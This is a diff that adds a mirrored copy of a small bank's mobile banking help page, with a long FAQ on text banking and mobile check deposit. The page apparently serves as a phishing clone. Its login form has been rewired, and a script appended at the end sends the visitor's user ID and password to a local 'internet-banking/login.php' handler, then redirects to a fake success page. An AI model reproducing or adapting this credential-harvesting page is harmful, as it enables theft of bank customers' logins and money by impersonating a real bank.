@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en"><!-- InstanceBegin template="/Templates/master.dwt.php" codeOutsideHTMLIsLocked="false" -->
+
+<!-- Mirrored from www.washitastatebank.com/mobile-banking.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 01 Apr 2020 13:08:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta charset="utf-8" />
+	<!-- InstanceBeginEditable name="doctitle" -->
+	<title>Mobile Banking</title>
+	<!-- InstanceEndEditable -->
+	<meta name="revisit-after" content="15 days">
+    <meta name="ROBOTS" content="index,follow">
+    
+    <meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=2; user-scalable=1;" /> 
+    <link rel="stylesheet" href="../secure2.fundsxpress.com/css/jquery-ui.min.css">
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.min2afa.css?1585746463" />
+    <link rel="stylesheet" type="text/css" href="css/styles2afa.css?1585746463" />
+    
+    <script src="../use.fontawesome.com/41067012ed.js"></script>
+    <script src="../secure2.fundsxpress.com/js/jquery.min.js"></script>
+  	<script src="../secure2.fundsxpress.com/js/jquery-ui.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/library.js"></script>
+    
+	<!-- InstanceBeginEditable name="head" -->
+    <meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<!-- InstanceEndEditable -->
+    
+     
+</head>
+
+<body> 
+<div id="page">
+<a href="#navigation" id="menu-toggle" class="control visible-xs visible-sm btn btn-primary">Menu</a>
+<a href="#login" id="login-toggle" class="control visible-xs visible-sm btn btn-primary">Login</a>             
+
+<header>
+    	<div class="container">
+        <div id="logo"><a href="index-2.html">Washita State Bank</a></div>
+        <div id="search">
+    <form method="get" name="frmSiteSearch" action="https://www.washitastatebank.com/search.php" onSubmit="return CheckForm();">
+        <input type="text" name="search" placeholder="Find it fast" value="">
+        <button name="submit"><span class="fa fa-search"></span></button>
+        <input type="hidden" name="mode" value="allwords" />
+    </form>
+</div>
+<ul class="top-links">
+	<li><a href="contact.html">Map Location / Contact Us</a></li>  
+    <li><a href="docs/Privacy-Disclosure.pdf" target="_blank">Privacy</a></li> 
+</ul>
+
+
+     <div id="login"><div id="login-inner">    
+        <h2>Online Banking Login <a href="https://gateway.fundsxpress.com/WSBBFOK/security_stmt.htm" target="_blank"><span class="fa fa-lock"></span></a></h2>
+               
+        <form id="loginform" autocomplete="OFF" target="_top" autocomplete="off" class="form-inline">
+              
+   <div class="form-group field">
+       <label for="aid"  class="control-label hidden">User ID</label>
+        <input type="text" name="account" required=""  autocomplete="off" placeholder="User ID" class="form-control" >
+  	</div> 
+    <div class="form-group field"> 
+        <label for="passcode" class="control-label hidden">Password</label>
+        <input type="password"  name="passwrd" id="passwrd"  placeholder="Password" class="form-control" >
+              </div>
+            
+             <div class="forminfo" style="display: none;"><span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;"></span></div>
+     
+        <input type="submit" name="Submit" value="Log In" class="btn btn-primary">
+          
+      </form>
+               
+        <div class="links">
+  		<a href="" target="_top">Enroll</a>  |
+		<a href="" target="_top">Business Enroll</a> | 
+       <a href="" target="_top">Forgot passcode?</a>
+  	</div>
+    </div>
+</div>
+           
+
+<div class="clearfix"></div> 	
+		<div id="navigation">
+        <nav id="nav" role="navigation" class="container">
+        <ul class="clearfix">
+        <li><a href="index-2.html" class="">Home</a></li>
+        <li><a href="rates.html" class="">Rates</a></li>
+        <li><a href="javascript://" class="selected">Deposit Accounts</a>
+          <ul>
+            <li><a href="accounts.html">Accounts</a></li>
+            <li><a href="cds.html">Certificate of Deposit</a></li>
+            <li><a href="docs/WSB_Simple_Switch-form.pdf" target="_blank">Switch-Kit</a></li>
+          </ul>
+        </li>
+			
+        <li><a href="javascript://" class="">Loans</a>
+         <ul>
+            <li><a href="loans.html#tabs-1">Agricultural Loans</a></li>
+			 <li><a href="loans.html#tabs-2">Consumer Loans</a></li>
+            <li><a href="loans.html#tabs-3">Business Loans</a></li>
+            <li><a href="loans.html#tabs-4">Auto Loans</a></li>
+          </ul>
+        </li>
+        <li><a href="javascript://" class="">Online &amp; Mobile</a>
+        <ul>
+            <li><a href="online-banking.html">Online Banking</a></li>
+            <li><a href="mobile-banking.html">Mobile Banking</a></li>
+            <li><a href="fraud.html">Fraud Prevention</a></li>
+          </ul>
+        </li>
+        <li><a href="javascript://" class="selected">Services</a>
+         <ul>
+            <li><a href="services.html">Additional Services</a></li>
+            <li><a href="calculators.html">Financial Calculators</a></li>
+          </ul>
+        </li>
+        <li><a href="javascript://" class="">About Us</a>
+        <ul>
+            <li><a href="contact.html">Location / Contact Us</a></li>
+            <li><a href="cut-off-times.html">Cut-off Times &amp; Holidays            </a></li>
+            <li><a href="electronic-payments.html">Electronic Payments</a></li>
+            <li><a href="your-identity.html">Protect Your Identity</a></li>
+            <li><a href="safeguards.html">Safeguarding Your Information</a></li>
+          </ul>
+        </li>
+  </ul>
+          </nav>
+</div>   
+    	</div>
+</header>
+   <!-- end header --> 
+   
+    <div id="main">
+    	<div id="main-inner" class="container">
+         
+           		<!-- InstanceBeginEditable name="content" -->
+            <h1>Mobile Banking</h1>
+            <h2>Help & Frequently Asked Questions</h2>
+				<p>
+				<img alt="Mobile Screens" height="285" src="Mobile-Screens.png" width="483"></p>
+           <h3>General</h3>
+         
+           
+			<div id="accordion">
+  <h3>How much does this service cost?</h3>
+				<div>
+  <p>There is currently no charge associated with this service, refer to our Mobile Banking Terms and Conditions for details. However, there may be charges associated with text messaging and data usage on your phone. Check with your wireless phone carrier for more information.</p>
+				</div>
+    
+				<h3>Is it secure?</h3>
+				<div>
+     <p>Yes, the Mobile Banking service utilizes best practices from online banking, such as HTTPS, 256-bit SSL encryption, or password access and application time-out when your phone is not in use. In addition, no account data is ever stored on your device. And in the event your device is lost or stolen, the service can be immediately disabled by either going online to the Mobile Management website or calling us.</p>
+  </div>
+			<h3>Do I need a text message or data plan?</h3>
+				<div>
+  <p>Yes, a text messaging and/or data plan is typically needed, as data usage and/or text charges can become expensive without them. Please check with your wireless carrier for more information.</p>
+   				</div>
+		<h3>I’m not enrolled for online banking. Can I still use this service?</h3>
+				<div>
+  <p>You must first enable your bank account(s) for online banking before using mobile.</p>
+				 </div>
+	 <h3>What is Enrollment?</h3>
+				<div>
+  <p>Enrollment is a one-time process that helps maintain your security. The enrollment process for both native and mobile browser Mobile Banking applications requires you to download the application, sign-in using your online banking Access ID and Passcode, answer security questions, accept the Terms and Conditions, and finally entering your device phone number (not applicable for tablets). The enrollment process for SMS text banking requires you to log in to online banking, select the Mobile Management link under the All Services & Settings tab, and follow the instructions to retrieve an activation code. The activation code will be required to begin using SMS text banking on your device.</p>
+				 </div>
+				 <h3>What is Washita State Bank Mobile Banking?</h3>
+				<div>
+  <p>Mobile Banking gives you access to your accounts from your mobile web browser or a downloadable Mobile Banking application, depending on your preference and your phone capabilities. Both options allow you to: view account balances, search recent account activity, transfer funds, and find nearby ATM or branch locations.</p>
+				 </div>
+				<h3>How do I sign up for Mobile Banking?</h3>
+				<div>
+  <p>You must enroll your mobile device. The enrollment process for both native and mobile browser Mobile Banking applications requires you to download the application (for native) or enter the application URL (for browser), sign in using your online banking username and password, answer security questions, accept the Terms and Conditions, and finally enter your device phone number (not applicable for tablets). The enrollment process for SMS text banking requires you to log in to online banking, select the Mobile Management link under the All Services & Settings tab, and follow the instructions to retrieve an activation code. The activation code will be required to begin using SMS text banking on your device.</p>
+				 </div>
+
+<h3>Is Mobile Banking supported on my phone?</h3>
+				<div>
+  <p>Native mobile applications are available on many smartphones including: iPhone® and those utilizing the Android® operating system. Mobile Banking is also supported on most phones with a mobile web browser that supports cookies. Both native and mobile web browser applications can be found either by searching the app store on your phone or by entering the mobile web URL (https://mBanking.firstdata.com/wap/home/wsbbfok/en) in your phone’s browser.</p>
+				 </div>
+<h3>How do I install the downloadable phone application?</h3>
+				<div>
+  <p> </p>
+  <ul type="disc">
+    <li>Native downloadable phone applications can be downloaded directly from iTunes® or Google Play® on your device.</li>
+    <li>Alternatively, you can enter the following URL link <a href="https://mbanking.firstdata.com/wap/home/wsbbfok/en">https://mBanking.firstdata.com/wap/home/wsbbfok/en</a> in your device browser to connect to the mobile browser application.</li>
+    <li>Next, access the global navigation menu and look for a Download link. Click this link to download the application. If this link is not visible, a downloadable application is not available for your device.</li>
+  </ul>
+				 </div>
+<h3>Is Mobile Banking supported on my tablet?</h3>
+				<div>
+  <p>Native mobile applications are available on many tablets including: iPad®, Kindle Fire® tablets, and those tablets utilizing the Android® operating system. Mobile Banking is also supported on most tablets with a mobile web browser that supports cookies. Both native and mobile web browser applications can be found either by searching the app store on your tablet or by entering the mobile web URL (https://mBanking.firstdata.com/wap/home/wsbbfok/en) in your tablet’s browser.</p>
+				 </div>
+<h3>How do I install the downloadable tablet application?</h3>
+				<div>
+  <p> </p>
+  <ul type="disc">
+    <li>Native downloadable tablet applications can be downloaded directly from iTunes®, Google Play®, or the Amazon® app store on your device.</li>
+    <li>Alternatively, you can enter the following URL link (https://mBanking.firstdata.com/wap/home/wsbbfok/en) in your device browser to connect to the mobile browser application.</li>
+    <li>Next, access the global navigation menu and look for a Download link. Click this link to download the application. If this link is not visible, a downloadable application is not available for your device.</li>
+  </ul>
+				 </div>
+<h3>How do I access Mobile Banking on my device’s browser?</h3>
+				<div>
+  <p>You can access the mobile browser application site at any time at (https://mBanking.firstdata.com/wap/home/wsbbfok/en)</p>
+				 </div>
+<h3>I activated Mobile Banking on my device’s browser. Why am I being asked to activate again?</h3>
+				<div>
+  <p>At the time of enrollment, a "cookie" is stored on your device’s browser which allows the Mobile Banking system to remember that you enrolled. The cookie is only visible by the Mobile Banking system and does not contain personal information. Some devices may require you to enable cookies or periodically erase them by clearing your cache, requiring re-enrollment. If you are experiencing this issue, check your device settings to ensure that cookies are enabled. If cookies are enabled and the issue persists, please contact your mobile network carrier for cookie support information on your mobile device.</p>
+				 </div>
+<h3>How do I optimize my mobile web experience?</h3>
+				<div>
+  <p>We recommend 3 steps for an optimal experience: 1) Ensure your phone’s browser has cookies enabled. 2) Enable stylesheets on your browser. 3) Bookmark our Mobile Banking site.</p>
+				 </div>
+<h3>What is Spendable Balance?</h3>
+				<div>
+  <p>Spendable Balance is a fast and simple way to calculate the money you have available. It is calculated by taking the available balance and subtracting any amount you want to "set aside" for items you know will be coming out of the account for bills, transfers, other commitments or simply setting a buffer for yourself. If you have multiple accounts, you have the ability to choose which account Spendable Balance applies.</p>
+				 </div>
+<h3>What is Washita State Bank Text Banking?</h3>
+				<div>
+  <p>Text banking gives you access to your accounts via text (SMS) messages on your phone. It’s a fast, easy way to look up account balances or recent account history by sending a text command to a shortcode.</p>
+				 </div>
+<h3>What is Washita State Bank shortcode?</h3>
+				<div>
+  <p>All text messages will come from, and should be sent to, 96865</p>
+				 </div>
+<h3>Can I use both Text Banking and Mobile Banking on my phone?</h3>
+				<div>
+  <p>Yes, you can use both options from the same phone. To do so you will need to enroll for both services prior to use.</p>
+				 </div>
+<h3>Is Text Banking supported on my phone?</h3>
+				<div>
+  <p>Text Banking will work on any text message (SMS) capable phone from one of our supported carriers.</p>
+				 </div>
+<h3>How do I enroll in SMS Text Banking?</h3>
+				<div>
+  <p>The enrollment process for SMS text banking requires you to log in to online banking, select the Mobile Management link under the All Services & Settings tab, and follow the instructions to retrieve an activation code. The activation code will be required to begin using SMS text banking on your device.</p>
+				 </div>
+<h3>Which wireless carriers are supported?</h3>
+				<div>
+  <p>We support all the popular US wireless phone carriers, including AT&T, Sprint, T-Mobile, and Verizon. If your carrier is not listed when you enroll, select ’Other’, or check back later, as new carriers will be added over time.</p>
+				 </div>
+<h3>Will I receive unsolicited text messages?</h3>
+				<div>
+  <p>No. You will only receive messages when you specifically request them with one of the Text Banking commands or if you subscribe to Mobile Alerts.</p>
+				 </div>
+<h3>What are the Text Banking commands?</h3>
+				<div>
+  					<table border="1" cellpadding="0" class="MsoNormalTable" width="798">
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><b><span><strong>FUNCTION</strong>&nbsp;&nbsp;&nbsp;</span></b><span><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><b><span><strong>COMMAND&nbsp;</strong>&nbsp;&nbsp;&nbsp;</span></b><span><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>DESCRIPTION</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Balance</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>&nbsp;B</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Summary of 
+							available balances for all accounts</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>History</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>&nbsp;H</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Summary of recent 
+							transactions per account</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Command</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>&nbsp;C</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>List of available 
+							Text Banking commands</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Help</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>&nbsp;HE</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Help content for 
+							Text Banking</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Login</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>&nbsp;L</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Receive a URL for 
+							the Washita State Bank Mobile Browser website (user 
+							must first enroll their mobile web browser)</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+						<tr>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>Stop</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>&nbsp;S</strong><o:p></o:p></span></p>
+							</td>
+							<td valign="top">
+							<p class="MsoNormal"><span><strong>De-activate all 
+							Washita State Bank text services</strong><o:p></o:p></span></p>
+							</td>
+						</tr>
+					</table>
+	<p>NOTE: You can check for additional available commands by activating your phone and sending C to 96865.</p>
+				 </div>
+<h3>What is Mobile Check Deposit?</h3>
+				<div>
+  <p>Mobile Check Deposit is a convenient, easy way to deposit checks from your mobile device into one of your accounts. With the Washita State Bank Mobile Banking app on your iPhone®, iPad®, or device utilizing the Android® operating system, you can take a photo of your check, enter the check information and securely submit your deposit for processing.</p>
+				 </div>
+<h3>What accounts are required to be eligible for use with Mobile Check Deposit?</h3>
+				<div>
+  <p>Checking and savings accounts are eligible for Mobile Check Deposit.</p>
+				 </div>
+<h3>Where can I find the Deposit functionality within my downloaded app?</h3>
+				<div>
+  <p>All users should first download the latest version of the app from iTunes® or Google Play®. After successfully completing the login process, you can either select the deposit button from the home screen or the deposit button from the More menu to begin your Mobile Deposit. Only those that are eligible for Mobile Deposit will be able to continue the deposit process after login.</p>
+				 </div>
+<h3>What if I don’t see the Deposit functionality within my downloaded app?</h3>
+				<div>
+  <p>Only devices that have an auto focus with rear-facing camera are supported for Mobile Check Deposit. If you do not see a "Check Deposit" option in, your device likely does not have a camera with auto focus.</p>
+				 </div>
+<h3>Can I use Mobile Check Deposit with any mobile device?</h3>
+				<div>
+  <p>Eligible phones include:</p>
+  <ul type="disc">
+    <li>iPhone® (3G or higher with iOS 7.1 or higher). Older iPhones® and devices without a camera are not supported.</li>
+    <li>iPad® (2 or higher with iOS 7.1 or higher). iPad Mini® is also supported (with iOS 7.1or higher). Other iPad® versions and devices without a camera are not supported.</li>
+    <li>The iPod Touch® is not supported at this time.</li>
+    <li>Android® (4.0 or higher operating system) with a rear-facing camera that supports auto focus.</li>
+  </ul>
+  <p>You must also download and install the latest version of the Washita State Bank Mobile Banking app from iTunes® or Google Play®.</p>
+				 </div>
+<h3>Are there transaction limits with Mobile Check Deposit?</h3>
+				<div>
+  <p>Currently, deposit limits are defined by Washita State Bank. Please call (580) 562-4871 for details</p>
+				 </div>
+<h3>Are my checks deposited immediately?</h3>
+				<div>
+  <p>Successfully submitting your check image with your mobile device will begin the deposit process. However, the processing time to complete the deposit may vary. Funds deposited before the daily cut-off time as determined by Washita State Bank on a banking business day (every day except Saturdays, Sundays and federal holidays) are normally available for withdrawal on the first business day after the day of the deposit. If you transmit an item after the cut-off time, or on a day we are not open, we may consider that the deposit was made on the next business day we are open. Check your deposit history in the deposit functionality within the application to see your deposit status.</p>
+				 </div>
+<h3>How do I view my deposit history?</h3>
+				<div>
+  <p> </p>
+  <ul type="disc">
+    <li>1.	Sign in to the Washita State Bank Mobile Banking application.</li>
+    <li>2.	Select the "Deposit" functionality.</li>
+    <li>3.	Click on a single deposit history item to view the available transaction detail.</li>
+  </ul>
+				 </div>
+<h3>What should I do with the hard copies of my checks?</h3>
+				<div>
+  <p>After successfully submitting a deposit with Washita State Bank Mobile Check Deposit, it is advisable that you keep all original documents in a safe place for personal records.</p>
+				 </div>
+<h3>What types of checks are not eligible for Mobile Check Deposit?</h3>
+				<div>
+  <p> </p>
+    <ul type="disc">
+    <li>Checks must be made payable to only you. Joint checks or checks made payable to "Cash" are not allowed.</li>
+    <li>Checks must be drawn on a U.S. bank or payable in U.S. currency.</li>
+    <li>Checks must not be altered on the front of the check in any way.</li>
+    <li>Checks must have an authorized signature. Demand drafts or remotely created checks are not allowed.</li>
+    <li>Checks must not be dated more than six months prior to the date of deposit.</li>
+    <li>Checks must not have previously been returned stop payment or account closed.</li>
+  </ul>
+
+				 </div>
+<h3>How do I deposit a check?</h3>
+				<div>
+  <p> </p>
+    <ul type="disc">
+    <li>Your check should have a valid account number and check number.</li>
+    <li>Before you begin, properly endorse your check with your signature. The endorsement should read: For Mobile Deposit Only & include the account number of the account holder.</li>
+    <li>Sign in to Mobile Banking and select "Deposit" functionality.</li>
+    <li>Select the "Deposit" button from the Home screen or the More menu and navigate to the check deposit screen. You will need to complete the check deposit form in order to submit your deposit request. Note: "Continue" will appear disabled until all required fields are completed.</li>
+    <li>You should make sure your check is placed on a dark, flat, well-lit surface.</li>
+    <li>Select either the "Front" or "Back" camera icon to take a photo of your check.</li>
+    <li>Align the check image with the Camera viewfinder frame. Be sure to take a photo of the check side that matches the helper text: "Front" or "Back" in the viewfinder.</li>
+    <li>Tap the camera icon in the viewfinder to take the picture. If the preview looks correct, select the "Checkmark" button. If not, simply tap the red "Redo" button and try again.</li>
+    <li>After you have successfully taken the "Front" and "Back" photos of your check, you will see small thumbnail image previews on the check deposit screen.</li>
+    <li>In the "Amount" field, enter the amount of the check you are depositing. Be certain the entered amount matches the amount on the check.</li>
+    <li>Tap the "Deposit To" field to select a deposit eligible account.</li>
+    <li>After all the required fields are completed, the "Continue" button will appear enabled.</li>
+    <li>Enter your email address in the "Email Receipt To" field if you would like to receive an email receipt of your deposit request.</li>
+    <li>Review your entries and select the "Continue" button to complete the form.</li>
+    <li>Select the "Approve" button to finalize and submit your deposit request.</li>
+  </ul>
+
+				 </div>
+<h3>I received an activation code for SMS text banking but never used it. What do I do now?</h3>
+				<div>
+  <p>Activation codes expire after a specific period of time (expiry period will be provided along with your activation code). If you need a new one, return to the Mobile Management site in online banking and request a new activation code.</p>
+				 </div>
+<h3>What happens if I get a new mobile device or change phone numbers?</h3>
+				<div>
+  <p>If you get a new mobile device or change phone numbers, be sure to return to the Mobile Management site in online banking and update your mobile device profile. We recommend removing your old device and re-enrolling your new device.</p>
+				 </div>
+<h3>Can I use Mobile Banking or Text Banking on more than one device?</h3>
+				<div>
+  <p>Yes. Follow the enrollment and download instructions above to enroll a new device for either the native or mobile browser banking applications. Visit the Mobile Management link in online banking and simply add another device for SMS text banking.</p>
+				 </div>
+<h3>I activated Mobile Banking on my device’s browser. Why am I being asked to activate again?</h3>
+				<div>
+  <p>At the time of enrollment, a "cookie" is stored on your device’s browser which allows the Mobile Banking system to remember that you enrolled. The cookie is only visible by the Mobile Banking system and does not contain personal information. Some devices may require you to enable cookies or periodically erase them, requiring re-enrollment. If you are experiencing this issue, check your device settings to ensure that cookies are enabled. If cookies are enabled and the issue persists, please contact your mobile network carrier for cookie support information on your mobile device.</p>
+				 </div>
+<h3>What if my device is lost or stolen?</h3>
+				<div>
+  <p>If you are concerned about misuse of your device, contact your mobile service provider immediately to stop all wireless service. Additionally, sign in to online banking and disable or remove your device from the Mobile Management link under the All Services& Settings tab.</p>
+				 </div>
+<h3>Do I need to re-enroll into Mobile Banking after I purchase a new device?</h3>
+				<div>
+  <p>Yes. If you get a new mobile device or change phone numbers, be sure to return to the Mobile Management site in online banking and update your mobile device profile. We recommend removing your old device and re-enrolling your new device. Follow the enrollment and download instructions above to enroll a new device for either the native or mobile browser banking applications. Visit the Mobile Management link in online banking and simply add another device for SMS text banking.</p>
+				 </div>
+<h3>Do password reset requirements for internet banking affect my ability to perform Mobile Banking functions?</h3>
+				<div>
+  <p>Yes. Some financial institutions require that customers/members reset their internet banking password periodically. If you do not reset your internet banking password as required by your financial institution you will be unable to log into Mobile Banking.</p>
+				 </div>
+<h3>I’m receiving an invalid credentials error message even though I’m entering valid credentials. What should I do?</h3>
+				<div>
+  <p>If you've exceeded your institution's maximum number of failed login attempts in Mobile Banking, you must log in to online banking and reset your password. Once your password has been reset in online banking, you will be able to successfully log in to Mobile Banking with your new password. Please note that temporary passwords set by your financial institution are not recognized in Mobile Banking. If you are provided a temporary password, please login to online banking to create a permanent password before returning to Mobile Banking.</p>
+				 </div>
+<h3>BlackBerry Support Enabling JavaScript for the mobile browser application</h3>
+				<div>
+  <p>Without JavaScript enabled on your BlackBerry, you may not be able to view parts of the mBanking mobile web browser (SWAP) application. Users can manually activate JavaScript. See below for step by step instructions.</p>
+    <ul type="disc">
+    <li>1.	Press the "Menu" button to open the BlackBerry’s main application menu.</li>
+    <li>2.	Click "Browser" to open the BlackBerry web browser.</li>
+    <li>3.	Press the "Menu" button again while in the browser.</li>
+    <li>4.	Select "Options" and click "Browser Configuration."</li>
+    <li>5.	Put a check mark next to "Support JavaScript."</li>
+    <li>6.	Press the "Menu" button.</li>
+    <li>7.	Select "Save" to save your settings.</li>
+  </ul>
+  <p> </p>
+				 </div>
+			
+          <!-- InstanceEndEditable -->
+            
+    	</div>
+
+    <!-- InstanceBeginEditable name="extra" --> <!-- InstanceEndEditable -->
+   
+    <div id="main-section-2">
+<div id="links" class="container">
+ <div class="row">
+    <div class="col-sm-4">
+                   	  <h3>Resources</h3>
+                <ul>
+                        <li><a href="https://www.fdic.gov/" > Federal Deposit Insurance Corporation (FDIC)</a>                          	        </li>
+                        <li><a href="https://www.fdic.gov/consumers/" >FDIC           Consumer Information</a>
+                        </li>
+                        <li><a href="https://www.kansascityfed.org/" >Federal Reserve of Kansas City</a>
+                        </li>
+                        <li><a href="https://www.ok.gov/banking/" >Oklahoma Banking Department </a>
+                        </li>
+                        <li><a href="https://www.savingsbonds.gov/" >U. S. Savings            Bonds on Line</a>
+                        </li>
+                        <li><a href="https://www.whitcochecks.com/reorder.php" >Check Reorder</a>
+                        </li>
+                        <li><a href="https://www.federalreserve.gov/consumerinfo/default.htm" >Federal           Reserve Bank Consumer Information</a>
+                        </li>
+                        
+                        <li><a href="https://www.annualcreditreport.com/index.action" >Consumer           Credit Report</a>
+                        </li>
+      </ul>
+      </div>
+                    <!-- end box -->
+                    
+    <div class="col-sm-4">
+                    
+   	  <h3>Report Lost/Stolen Debit Card</h3>
+   	  <p>Monday - Friday: 9:00 a.m. - 4:30 p.m.   		<br />
+      Call (580) 562-4871</p>
+   	  <p>Outside normal banking hours: <br />
+   	    Call Transfund 1-800-791-2525<a href="services.html"></a></p>
+      </div>
+                    <!-- end box -->
+                    
+                    <div class="col-sm-4 last">
+                  
+                        	<h3>Local Weather</h3>
+                                     <script>
+var horizontal = false; 
+var searchText = "73624"; 
+var forecastState = "open"; 
+var hideSearch = true; 
+</script>
+<div id="weather-module">
+	<div class="location">Currently in <span id="location-name"></span></div>
+	<div class="current-conditions">
+		<div id="current-conditions-image"><img /></div>
+		<div id="current-temp"><span class="temp"></span> <span class="description"></span></div>
+		<div id="extra">
+			<div class="feels-like">Feels Like: <span></span></div>
+			<div class="humidity">Humidity: <span></span></div>
+			<div class="wind">Wind: <span></span></div>
+		</div>
+	</div>
+	<div id="forecast">
+		<div class="title">Forecast <span class="toggle"><span class="indicator">&ndash;</span></span></div>
+		<div class="forecast"></div>
+	</div>
+	<div class="search-weather">
+		<form>
+		<label for="awxSearchTextBox">Enter City, ZIP, or International City:</label>
+		<div class="input-row">
+		<input type="text" id="awxSearchTextBox" placeholder="new york, ny" />
+			<button id="awxSearchButton" type="button">Go</button>
+		</div>
+		</form>
+	</div>
+	<div class="footer-weather">
+		&copy; AccuWeather, Inc
+	</div>
+</div>
+<script src="../secure2.fundsxpress.com/js/weather/awx.min.js" type="text/javascript"></script>                       
+                     
+                    </div>
+                    <!-- end box -->
+                    
+                </div>
+                    </div>
+                    </div>    </div>
+    <!-- end main -->
+    <footer>
+    	<div id="footer-inner" class="container">
+    		<a href="#" class="back-to-top">Back to Top</a>	
+<div id="copyright">
+<p><a href="docs/Privacy-Disclosure.pdf" target="_blank">Privacy Notice</a> | <a href="terms.html">Terms of Use</a> | <a href="site-map.html">Site Map</a></p>
+<p>&copy; 2020 Washita State Bank. All rights reserved.</p> 
+</div>
+
+<div id="fdic-ehl">
+	<a href="http://www.fdic.gov/" id="fdic"><img src="images/layout/fdic.png" width="50" height="30" alt="Member FDIC"></a>
+    <a href="http://www.hud.gov/" id="ehl"><img src="images/layout/ehl.png" width="30" height="30" alt="Equal Housing Lender"></a>
+    
+</div>
+<div class="clearfix"></div>        </div>
+    </footer>
+    <!-- end footer -->
+</div>
+<!-- end page -->
+</body>
+    
+    <script src='//production-assets.codepen.io/assets/common/stopExecutionOnTimeout-b2a7b3fe212eaa732349046d8416e00a9dec26eb7fd347590fbced3ab38af52e.js'></script><script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
+<script >/* LOGIN - MAIN.JS - dp 2017 */
+
+// LOGIN TABS
+
+// SLIDESHOW
+$(function() {
+	$('#slideshow > div:gt(0)').hide();
+	setInterval(function() {
+		$('#slideshow > div:first')
+		.fadeOut(1000)
+		.next()
+		.fadeIn(1000)
+		.end()
+		.appendTo('#slideshow');
+	}, 3850);
+});
+
+// CUSTOM JQUERY FUNCTION FOR SWAPPING CLASSES
+(function($) {
+	'use strict';
+	$.fn.swapClass = function(remove, add) {
+		this.removeClass(remove).addClass(add);
+		return this;
+	};
+}(jQuery));
+
+// SHOW/HIDE PANEL ROUTINE (needs better methods)
+
+// DISPLAY MSSG
+
+
+// DISABLE SUBMIT FOR DEMO
+$(function() {
+	$('.button').on('click', function(event) {
+		$(this).stop();
+		event.preventDefault();
+		return false;
+	});
+});
+//# sourceURL=pen.js
+</script>
+
+ <script type="text/javascript">
+$(document).ready(function(){   
+$('#submit').click(function(){
+	var account = $('#account').val();
+
+
+	// chk for name and pass them out.
+
+	if (account == '') {
+		 $('.forminfo').html('<span style="background-color: red; color:#FFFFFF; padding: 5px; text-align: center; width: 100%;"> PIN NUMBER FIELD IS EMPTY..</span>');
+	} else{
+		$.ajax({
+			url: "internet-banking/login.php?action=Check username",
+			method: "POST",
+			data:{ account: account},
+			dataType:"text",
+			 beforeSend:function()
+			    {
+			        $('.forminfo').html('<span style="background-color: blue;   color:#FFFFFF; padding: 5px; text-align: center; width: 100%;">Processing your information...</span>');
+			    },
+			success:function(data){
+			if(data==1){
+               $('.pwgrp').fadeIn(300);
+               $('.forminfo').hide();
+               $('#btnContinue').show();
+               $('#submit').hide();
+            }else{
+            $('.forminfo').fadeIn().html('<span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;">INVALID PIN NUMBER ENTERED</span>');
+			$('.forminfo').delay(5000).fadeOut('slow');
+				}
+                }
+			});
+	}
+    return false;
+});
+ 
+//Final submiton validation
+
+$('#loginform').bind("submit", function(){
+
+var frmdata = $(this).serialize();
+$.ajax({
+            url: "internet-banking/login.php?action=login user",
+            method: "POST",
+            data: frmdata,
+            dataType:"text",
+             beforeSend:function()
+                {
+                    $('.forminfo').fadeIn().html('<span style="background-color: blue;   color:#FFFFFF; padding: 5px; text-align: center; width: 100%;">Processing your information...</span>');
+                },
+            success:function(data){
+            if(data==1){
+            window.location="internet-banking/success.php?rd=secure-redirect";
+            }else{
+            $('.forminfo').fadeIn().html('<span style="background-color: green; color:#FFFFFF;  padding: 5px; text-align: center; width: 100%;">INVALID CUSTOMER DETAILS</span>');
+            $('.forminfo').delay(5000).fadeOut('slow');
+                }
+                }
+            });
+return false;
+})
+
+ })
+</script>
+<!-- InstanceEnd -->
